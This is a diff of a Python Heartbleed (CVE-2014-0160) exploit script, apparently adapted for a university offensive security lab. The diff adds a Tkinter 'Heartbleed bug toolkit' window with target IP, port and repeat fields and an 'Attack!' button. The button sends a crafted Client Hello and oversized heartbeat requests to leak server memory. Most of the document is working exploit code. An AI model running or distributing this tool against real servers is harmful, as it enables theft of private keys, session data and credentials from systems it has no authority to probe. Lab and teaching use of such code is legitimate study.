@@ -1,11 +1,14 @@
 #!/usr/bin/python
+# coding=utf-8
 
 # Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)
 # The author disclaims copyright to this source code
 # Minor customizations by Malik Mesellem (@MME_IT)
 # New options added for the course Lab on Offensive Computer Security TU/e (2019):
 #   - Claudiu Ion (TU/e)
-#   - Leon van de Beek (TU/e)
+#   - Léon van de Beek (TU/e)
+#
+#
 
 import sys
 import struct
@@ -13,7 +16,12 @@ import socket
 import time
 import select
 import re
+from Tkinter import *
 from optparse import OptionParser
+
+window = Tk()
+window.title("Heartbleed bug toolkit")
+window.configure(width = 600, height = 400)
 
 class colors:
     HEADER = '\033[95m'
@@ -47,10 +55,10 @@ c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
 00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
 00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
 00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
-00 0f 00 01 01                                  
+00 0f 00 01 01
 ''')
 
-hb = h2bin(''' 
+hb = h2bin('''
 18 03 02 00 03
 01 40 00
 ''')
@@ -60,7 +68,7 @@ hb = h2bin('''
 #    03 02   : TLS version
 #    00 03   : length
 #    01      : hearbeat request
-#    40 00   : payload length 16 384 bytes check rfc6520 
+#    40 00   : payload length 16 384 bytes check rfc6520
 #              The total length of a HeartbeatMessage MUST NOT exceed 2^14
 #              example: FF FF (= 65535 bytes) thus we will received 4 paquets of length 16384 bytes
 
@@ -77,7 +85,7 @@ def recvall(s, length, timeout=5):
     rdata = ''
     remain = length
     while remain > 0:
-        rtime = endtime - time.time() 
+        rtime = endtime - time.time()
         if rtime < 0:
             return None
         r, w, e = select.select([s], [], [], 5)
@@ -89,7 +97,7 @@ def recvall(s, length, timeout=5):
             rdata += data
             remain -= len(data)
     return rdata
-        
+
 
 def recvmsg(s):
     hdr = recvall(s, 5)
@@ -159,3 +167,61 @@ def main():
 
 if __name__ == '__main__':
     main()
+
+def maingui():
+    IP = IP_text.get()
+    PORT = PORT_text.get()
+    TIMES = TIMES_text.get()
+
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    print 'Connecting...'
+    sys.stdout.flush()
+    s.connect((IP, PORT))
+    print 'Sending Client Hello...'
+    sys.stdout.flush()
+    s.send(hello)
+    print 'Waiting for Server Hello...'
+    sys.stdout.flush()
+    while True:
+        typ, ver, pay = recvmsg(s)
+        if typ == None:
+            print 'Server closed connection without sending Server Hello.'
+            return
+        # Look for server hello done message.
+        if typ == 22 and ord(pay[0]) == 0x0E:
+            break
+
+    for i in range(TIMES):
+      print 'Sending heartbeat request #' + str(i+1) + '!'
+      sys.stdout.flush()
+      s.send(hb)
+      hit_hb(s)
+
+l1 = Label(window, text = "IP address to attack: ")
+l1.grid(row = 0, column = 0)
+
+l2 = Label(window, text = "Port to attack: ")
+l2.grid(row = 1, column = 0)
+
+l3 = Label(window, text = "Times to run attack: ")
+l3.grid(row = 2, column = 0)
+
+IP_text = StringVar()
+IP_text.set("192.168.1.101")
+e1 = Entry(window, textvariable = IP_text)
+e1.grid(row = 0, column = 1)
+
+PORT_text = IntVar()
+PORT_text.set(8443)
+e2 = Entry(window, textvariable = PORT_text)
+e2.grid(row = 1, column = 1)
+
+TIMES_text = IntVar()
+TIMES_text.set(1)
+e3 = Entry(window, textvariable = TIMES_text)
+e3.grid(row = 2, column = 1)
+
+b1 = Button(window, text = "Attack!", command = maingui)
+b1.grid(row = 4, column = 1)
+
+window.mainloop()
